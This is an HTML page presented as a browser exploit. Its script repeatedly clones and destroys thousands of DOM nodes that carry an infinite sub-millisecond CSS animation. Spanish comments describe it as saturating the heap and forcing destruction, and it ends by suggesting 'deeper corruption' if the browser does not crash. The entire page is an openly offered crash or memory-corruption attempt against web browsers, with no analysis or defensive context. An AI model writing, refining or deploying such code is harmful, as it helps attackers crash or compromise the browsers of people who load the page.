<!DOCTYPE html>
<html>
<head>
<style>
@keyframes boom {
  from { opacity: 1; }
  to { opacity: 0; }
}
</style>
</head>
<body>
<div id="log" style="color:white;background:#111;padding:1em;">Running exploit...</div>

<script>
let parent = document.createElement("div");
document.body.appendChild(parent);

let target = document.createElement("div");
target.style.animation = "boom 0.1ms infinite";
parent.appendChild(target);

let frame = 0;

function sprayDOM() {
    try {
        // Saturamos el heap con nodos animados
        for (let i = 0; i < 1000; i++) {
            let clone = target.cloneNode(true);
            parent.appendChild(clone);
        }

        // Forzamos destrucción
        while (parent.firstChild) {
            parent.removeChild(parent.firstChild);
        }
    } catch (e) {
        log.textContent = "❌ Error: " + e.message;
    }

    if (frame++ < 1000) {
        requestAnimationFrame(sprayDOM);
    } else {
        log.textContent = "✅ No crash (try deeper corruption)";
    }
}

requestAnimationFrame(sprayDOM);
</script>
</body>
</html>
